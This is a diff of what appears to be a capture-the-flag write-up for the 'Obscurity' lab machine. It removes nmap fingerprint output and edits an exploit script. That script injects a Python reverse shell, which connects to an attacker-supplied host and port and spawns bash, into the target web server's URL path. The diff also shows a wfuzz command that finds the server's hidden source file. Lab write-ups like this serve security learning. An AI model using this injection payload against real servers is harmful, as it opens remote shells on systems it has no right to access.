@@ -68,41 +68,7 @@ PORT     STATE  SERVICE    VERSION
 |_http-server-header: BadHTTPServer
 |_http-title: 0bscura
 9000/tcp closed cslistener
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8080-TCP:V=7.80%I=7%D=3/7%Time=5E642F7E%P=x86_64-pc-linux-gnu%r(Get
-SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2007\x20Mar\x20202
-SF:0\x2023:35:30\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sat,\x2007\x
-SF:20Mar\x202020\x2023:35:30\nContent-Length:\x204171\nContent-Type:\x20te
-SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
-SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
-SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
-SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
-SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
-SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
-SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
-SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
-SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
-SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
-SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
-SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
-SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
-SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20S
-SF:at,\x2007\x20Mar\x202020\x2023:35:30\nServer:\x20BadHTTPServer\nLast-Mo
-SF:dified:\x20Sat,\x2007\x20Mar\x202020\x2023:35:30\nContent-Length:\x2041
-SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
-SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
-SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
-SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
-SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
-SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
-SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
-SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
-SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
-SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
-SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
-SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
-SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
-SF:-spinner\x20sk-spinner-wordpress\">\n");
+
 Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.18 (92%), Linux 3.16 (91%), Oracle VM Server 3.4.2 (Linux 4.1) (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Android 4.2.2 (Linux 3.4) (91%)
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
@@ -122,6 +88,7 @@ The web service page source code reveals the following.
 <h4 class="experience-title accent">Server Dev</h4>
 <p class="education-description">Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory</p>
 ```
+<img src="source-code.png"><br>
 
 This provides a unique point for pivoting. `SuperSecureServer.py` must exist somewhere. We can use Wfuzz to enumerate possibilities.
 `wfuzz -w /usr/share/wordlists/dirb/big.txt --hc 404 http://obscure.htb:8080/FUZZ/SuperSecureServer.py`
@@ -167,7 +134,7 @@ import urllib
 import os
 
 address = '{}/'.format(argv[3])
-revshell = 'SUCKITLOL\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"])\na=\''.format(argv[1], argv[2])
+revshell = 'LOL\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"])\na=\''.format(argv[1], argv[2])
 payload = urllib.parse.quote(revshell)
 
 #print(address + payload)
